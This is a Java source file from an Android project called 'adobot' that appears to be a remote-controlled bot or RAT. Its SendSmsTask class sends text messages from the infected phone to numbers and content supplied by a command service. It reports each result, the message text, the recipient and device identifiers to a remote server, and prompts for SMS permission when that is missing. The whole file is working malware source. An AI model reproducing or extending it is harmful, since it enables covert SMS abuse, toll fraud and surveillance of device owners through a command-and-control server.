package com.android.adobot.tasks;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.util.Log;

import com.android.adobot.CommandService;

import java.util.ArrayList;
import java.util.HashMap;

import com.android.adobot.Constants;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;

/**
 * Created by adones on 2/26/17.
 */

public class SendSmsTask extends BaseTask {

    private static final String TAG = "SendSmsTask";

    private static final int MAX_SMS_MESSAGE_LENGTH = 160;
    private static final String SMS_SENT = "SMS_SENT";
    private static final String SMS_DELIVERED= "SMS_DELIVERED";
    private static final int SMS_PORT = 8091;

    private String phoneNumber;
    private String textMessage;

    public SendSmsTask(CommandService c) {
        setContext(c);
    }

    public void setTextMessage(String textMessage) {
        this.textMessage = textMessage;
    }

    public void setPhoneNumber(String phoneNumber) {
        this.phoneNumber = phoneNumber;
    }

    @Override
    public void run() {
        super.run();

        if(ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
            context.registerReceiver(receiver, new IntentFilter(SMS_SENT));
            sendSms(phoneNumber, textMessage);
        } else {
            Log.i(TAG, "No SMS permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", commonParams.getUid());
            noPermit.put("device", commonParams.getDevice());
            noPermit.put("permission", "SEND_SMS");
            Http doneSMS = new Http();
            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
            doneSMS.setMethod(HttpRequest.METHOD_POST);
            doneSMS.setParams(noPermit);
            doneSMS.execute();
            requestPermissions();
        }
    }

    public void sendSms(String phonenumber,String message)
    {
        SmsManager manager = SmsManager.getDefault();

        PendingIntent piSend = PendingIntent.getBroadcast(context, 0, new Intent(SMS_SENT), 0);
        PendingIntent piDelivered = PendingIntent.getBroadcast(context, 0, new Intent(SMS_DELIVERED), 0);

        int length = message.length();

        if(length > MAX_SMS_MESSAGE_LENGTH)
        {
            ArrayList<String> messagelist = manager.divideMessage(message);

            manager.sendMultipartTextMessage(phonenumber, null, messagelist, null, null);
        }
        else
        {
            manager.sendTextMessage(phonenumber, null, message, piSend, piDelivered);
        }
    }

    private BroadcastReceiver receiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            String event = "";
            String message = "";

            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    event = "sendmessage:success";
                    break;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    event = "sendmessage:failed";
                    message = "Message not sent.";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    event = "sendmessage:failed";
                    message = "No service.";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    event = "sendmessage:failed";
                    message = "Error: Null PDU.";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    event = "sendmessage:failed";
                    message = "Error: Radio off.";
                    break;
            }

            Log.i(TAG, event);

            HashMap params = new HashMap();
            params.put("event", event);
            params.put("message", message);
            params.put("textmessage", textMessage);
            params.put("phone", phoneNumber);
            params.put("uid", commonParams.getUid());
            params.put("device", commonParams.getDevice());

            Http req = new Http();
            req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
            req.setMethod(HttpRequest.METHOD_POST);
            req.setParams(params);
            req.execute();

            context.unregisterReceiver(receiver);
        }
    };
}
